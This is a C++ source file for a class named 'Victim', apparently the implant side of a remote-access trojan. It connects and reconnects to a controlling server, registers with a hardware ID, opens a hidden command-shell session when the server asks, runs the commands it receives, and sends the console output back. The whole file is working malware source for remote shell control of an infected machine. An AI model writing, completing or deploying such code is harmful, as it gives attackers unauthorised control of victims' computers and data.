#include "victim.hpp"
#include <thread>

Victim::Victim(std::string inHId)
	:
	myHId(inHId)
{
}

int Victim::runVictimProcess()
{
	while (!connectServer())
		sf::sleep(sf::seconds(2));

	while (true) {
		sf::Packet p;
		auto status = server.receive(p);

		if (status == sf::Socket::Status::Disconnected) {
			isSshActive = false;
			while (!connectServer())
				sf::sleep(sf::seconds(2));
		}
		if (status != sf::Socket::Status::Done)
			continue;

		uint16_t reqId = 0;
		uint8_t cmd;
		p >> reqId >> cmd;

		//start ssh session
		if (cmd == uint8_t(9)) {
			if (cmdSession != nullptr) {
				std::cerr << "cmd is not nullptr (unable to start session)\n";
				continue;
			}

			try {
				cmdSession = new CmdSession();
				sendCmdDataThread = new std::thread([this]() {
					sendCmdData();
				});
			}
			catch (std::exception& e) {
				std::cerr << "error creating cmd: " << e.what() << "\n";
				continue;
			}

			isSshActive = true;
		}
		//end ssh session
		else if (cmd == uint8_t(10)) {
			if (cmdSession == nullptr) {
				std::cerr << "cmd is already nullptr (unable to end session)\n";
				continue;
			}

			isSshActive = false;
			delete cmdSession;
			cmdSession = nullptr;

			sendCmdDataThread->join();
			delete sendCmdDataThread;
			sendCmdDataThread = nullptr;
		}
		//receive ssh data
		else if (cmd == uint8_t(11)) {
			std::string data;
			p >> data;

			if (cmdSession == nullptr) {
				std::cerr << "cmd session not initialized\n";
				continue;
			}

			cmdSession->sendCommand(data);
		}
	}

	return 0;
}

bool Victim::connectServer()
{
	isInitialized = false;
	server.disconnect();

	//connect to the server
	if (server.connect(serverIp, serverPort) != sf::Socket::Status::Done)
		return false;

	//send the registration request
	sf::Packet req;
	uint16_t reqId = requestId++;
	req << reqId << std::uint8_t(3) << myHId;
	if (server.send(req) != sf::Socket::Status::Done) {
		server.disconnect();
		return false;
	}

	sf::Packet res;
	bool waiting = true;
	//receive the initialization response
	const auto receive = [this, &waiting, &res, reqId]() {
		while (waiting) {
			res.clear();
			auto _ = server.receive(res);
			uint16_t resId;
			res >> resId;
			if (resId == reqId)
				waiting = false;
		}
	};

	std::thread receiveThread(receive);
	//wait for initialization response
	for (int i = 0; i < 10; i++) {
		sf::sleep(sf::milliseconds(500));
		if (!waiting)
			break;
	}

	if (waiting) {
		waiting = false;
		server.disconnect();
		receiveThread.join();
		return false;
	}
	receiveThread.join();

	bool success = false;
	res >> success;
	if (!success) {
		server.disconnect();
		return false;
	}

	res >> myId;
	isInitialized = true;
	return true;
}

void Victim::sendCmdData()
{
	while (isSshActive) {
		std::string output;
		if (cmdSession->readConsoleOutput(output)) {
			sf::Packet res;
			res << uint16_t(0) << uint8_t(11) << output;
			auto _ = server.send(res);
		}
	}
}
